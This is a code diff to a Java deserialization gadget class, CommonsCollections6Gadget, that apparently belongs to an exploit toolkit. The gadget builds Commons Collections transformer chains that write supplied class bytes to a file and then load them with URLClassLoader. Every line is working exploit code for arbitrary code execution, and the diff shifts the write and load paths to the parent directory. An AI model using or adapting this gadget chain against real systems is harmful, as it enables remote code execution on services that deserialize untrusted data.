@@ -119,7 +119,7 @@ public class CommonsCollections6Gadget implements ObjectGadget<Serializable> {
     @Override
     public Serializable getWriteFileObject(GadgetParam param) throws Exception {
         byte[] codeByte = param.getCodeByte();
-        String className = param.getClassName()+".class";
+        String className = "../"+param.getClassName()+".class";
         FileOutputStream.class.getConstructor(String.class).newInstance(className).write(codeByte);
         FileOutputStream.class.getConstructor(String.class).newInstance(className);
         final Transformer[] transformers = new Transformer[] {
@@ -141,7 +141,7 @@ public class CommonsCollections6Gadget implements ObjectGadget<Serializable> {
     public Serializable getLoadFileObject(GadgetParam param) throws Exception {
         String className = param.getClassName();
         String[] bootArgs = param.getBootArgs();
-        URL url = new URL("file:./");
+        URL url = new URL("file:../");
         URL[] urls = new URL[]{url};
         Transformer[] transformers = {
                 new ConstantTransformer(java.net.URLClassLoader.class)
